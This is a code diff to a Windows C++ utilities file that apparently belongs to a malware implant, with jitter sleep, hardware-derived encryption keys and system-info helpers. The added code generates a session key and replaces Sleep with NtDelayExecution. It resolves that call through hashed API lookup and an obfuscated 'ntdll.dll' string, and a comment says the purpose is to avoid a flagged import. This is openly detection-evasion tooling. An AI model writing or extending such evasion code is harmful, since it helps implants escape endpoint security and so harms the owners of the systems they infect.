@@ -1,8 +1,10 @@
 // utils.cpp — String conversion, Base64, XOR, AES-GCM (BCrypt), hardware key
 // derivation, system info, jitter sleep.
 #include "utils.hpp"
+#include "obfuscate.hpp"
 #include <windows.h>
 #include <bcrypt.h>
+#include <winternl.h>
 #include <sstream>
 #include <iomanip>
 #include <random>
@@ -148,6 +150,12 @@ std::vector<BYTE> DeriveHardwareKey() {
     }
 
     return digest;
+}
+
+std::vector<BYTE> GenerateSessionKey() {
+    std::vector<BYTE> key(32);
+    BCryptGenRandom(nullptr, key.data(), 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+    return key;
 }
 
 // ---------------------------------------------------------------------------
@@ -359,5 +367,21 @@ VOID JitterSleep(DWORD minSec, DWORD maxSec) {
     seconds = std::uniform_int_distribution<DWORD>(minSec, maxSec)(gen);
     LeaveCriticalSection(&cs);
 
-    Sleep(seconds * 1000);
+    // Use NtDelayExecution instead of Sleep to avoid flagged import
+    typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
+    static NtDelayExecution_t pfnDelay = nullptr;
+    if (!pfnDelay) {
+        HMODULE hNt = GetModuleHandleA(XS("ntdll.dll"));
+        pfnDelay = reinterpret_cast<NtDelayExecution_t>(
+            HashProc(hNt, FNV("NtDelayExecution")));
+    }
+
+    LONGLONG ms = static_cast<LONGLONG>(seconds) * 1000LL;
+    if (pfnDelay) {
+        LARGE_INTEGER li;
+        li.QuadPart = -ms * 10000LL;
+        pfnDelay(FALSE, &li);
+    } else {
+        Sleep(static_cast<DWORD>(ms));
+    }
 }
